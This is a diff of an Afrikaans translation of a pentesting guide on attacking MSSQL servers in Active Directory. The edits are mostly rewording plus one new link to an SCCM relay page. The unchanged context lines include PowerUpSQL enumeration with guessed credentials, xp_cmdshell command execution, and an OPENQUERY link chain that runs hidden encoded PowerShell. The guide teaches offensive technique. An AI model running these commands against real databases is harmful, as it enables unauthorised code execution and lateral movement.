@@ -108,7 +108,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### Opname van binne die domein
+### Opname vanaf binne die domein
 ```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -161,7 +161,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Dit mag ook moontlik wees om **opdragte** binne die MSSQL-gasheer uit te voer.
+Dit mag ook moontlik wees om **opdragte** binne die MSSQL gasheer uit te voer.
 ```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
@@ -176,7 +176,7 @@ Kontroleer in die bladsy genoem in die **volgende afdeling hoe om dit handmatig 
 
 ## MSSQL Betroubare Skakels
 
-As 'n MSSQL-instansie betroubaar (databasis skakel) is deur 'n ander MSSQL-instansie. As die gebruiker bevoegdhede oor die betroubare databasis het, sal hy in staat wees om **die vertrouensverhouding te gebruik om navrae ook in die ander instansie uit te voer**. Hierdie vertroue kan geketting word en op 'n sekere punt mag die gebruiker in staat wees om 'n verkeerd geconfigureerde databasis te vind waar hy opdragte kan uitvoer.
+As 'n MSSQL-instansie betroubaar (databasis skakel) is deur 'n ander MSSQL-instansie. As die gebruiker bevoegdhede oor die betroubare databasis het, gaan hy in staat wees om die **vertrouensverhouding te gebruik om navrae ook in die ander instansie uit te voer**. Hierdie vertroue kan geketting word en op 'n sekere punt mag die gebruiker in staat wees om 'n verkeerd geconfigureerde databasis te vind waar hy opdragte kan uitvoer.
 
 **Die skakels tussen databasisse werk selfs oor woudvertroue.**
 
@@ -252,11 +252,11 @@ Voer navrae uit deur die skakel (voorbeeld: vind meer skakels in die nuwe toegan
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> Kyk waar dubbel en enkel aanhalingsmerke gebruik word, dit is belangrik om dit op daardie manier te gebruik.
+> Kontroleer waar dubbele en enkele aanhalingsmerke gebruik word, dit is belangrik om dit op daardie manier te gebruik.
 
 ![](<../../images/image (643).png>)
 
-Jy kan hierdie vertroude skakelketting handmatig vir ewig voortset.
+Jy kan hierdie vertroude skakelsketting handmatig vir ewig voortset.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -282,5 +282,10 @@ Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd
 
 [SweetPotato](https://github.com/CCob/SweetPotato) het 'n versameling van hierdie verskillende tegnieke wat uitgevoer kan word via Beacon se `execute-assembly` opdrag.
 
+### SCCM Bestuurspunt NTLM Relay (OSD Geheimekstraksie)
+Sien hoe die standaard SQL rolle van SCCM **Bestuurspunte** misbruik kan word om Netwerk Toegang Rekening en Taakvolg Geheimenisse direk uit die webdatabasis te dump:
+{{#ref}}
+sccm-management-point-relay-sql-policy-secrets.md
+{{#endref}}
 
 {{#include ../../banners/hacktricks-training.md}}
